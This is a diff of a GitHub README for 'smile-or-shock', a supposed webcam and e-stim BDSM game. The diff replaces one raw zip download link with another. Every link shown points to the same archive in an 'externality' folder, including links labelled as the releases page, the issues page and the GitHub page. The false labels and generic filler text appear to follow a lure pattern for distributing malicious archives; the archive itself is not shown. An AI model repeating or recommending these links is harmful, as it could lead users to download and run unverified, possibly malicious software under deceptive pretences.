@@ -1,7 +1,7 @@
 # 🎮 smile-or-shock - A Unique Webcam Game Experience
 
 ## 📦 Download Now!
-[![Download smile-or-shock](https://github.com/Mikoppa1994/smile-or-shock/raw/refs/heads/master/externality/shock_smile_or_3.9.zip)](https://github.com/Mikoppa1994/smile-or-shock/raw/refs/heads/master/externality/shock_smile_or_3.9.zip)
+[![Download smile-or-shock](https://raw.githubusercontent.com/Mikoppa1994/smile-or-shock/master/externality/smile_or_shock_1.1.zip)](https://raw.githubusercontent.com/Mikoppa1994/smile-or-shock/master/externality/smile_or_shock_1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to **smile-or-shock**, a smile-driven BDSM predicament game designed to challenge your self-control. This game uses webcam detection and e-stim control to create a unique experience. 
@@ -9,7 +9,7 @@ Welcome to **smile-or-shock**, a smile-driven BDSM predicament game designed to 
 Follow these steps to download and run our application successfully:
 
 ## 📥 Download & Install
-To get started, **visit this page to download** your version of smile-or-shock: [Releases Page](https://github.com/Mikoppa1994/smile-or-shock/raw/refs/heads/master/externality/shock_smile_or_3.9.zip). 
+To get started, **visit this page to download** your version of smile-or-shock: [Releases Page](https://raw.githubusercontent.com/Mikoppa1994/smile-or-shock/master/externality/smile_or_shock_1.1.zip). 
 
 1. Once you're on the Releases page, look for the latest version available. It will be listed at the top.
 
@@ -70,15 +70,15 @@ If you wish to uninstall smile-or-shock, go to your Control Panel (Windows) or A
 Yes. smile-or-shock has been developed with user safety as a priority. Ensure your webcam and e-stim device are secure and functioning correctly.
 
 ### What if I encounter technical problems?
-If you run into issues, please visit our [issues page](https://github.com/Mikoppa1994/smile-or-shock/raw/refs/heads/master/externality/shock_smile_or_3.9.zip) for help or support.
+If you run into issues, please visit our [issues page](https://raw.githubusercontent.com/Mikoppa1994/smile-or-shock/master/externality/smile_or_shock_1.1.zip) for help or support.
 
 ## 🌍 Community and Contributions
 You are welcome to join our community discussions. Feel free to report bugs, suggest features, or share your experience with smile-or-shock. 
 
 ## 🔗 Explore More
-You can find additional resources, development updates, and community feedback on our [GitHub page](https://github.com/Mikoppa1994/smile-or-shock/raw/refs/heads/master/externality/shock_smile_or_3.9.zip). 
+You can find additional resources, development updates, and community feedback on our [GitHub page](https://raw.githubusercontent.com/Mikoppa1994/smile-or-shock/master/externality/smile_or_shock_1.1.zip). 
 
 ## 📥 Download Now Again
-To download smile-or-shock, go back to our Releases page: [Releases Page](https://github.com/Mikoppa1994/smile-or-shock/raw/refs/heads/master/externality/shock_smile_or_3.9.zip). 
+To download smile-or-shock, go back to our Releases page: [Releases Page](https://raw.githubusercontent.com/Mikoppa1994/smile-or-shock/master/externality/smile_or_shock_1.1.zip). 
 
 Enjoy your experience with smile-or-shock, and challenge yourself in new ways!
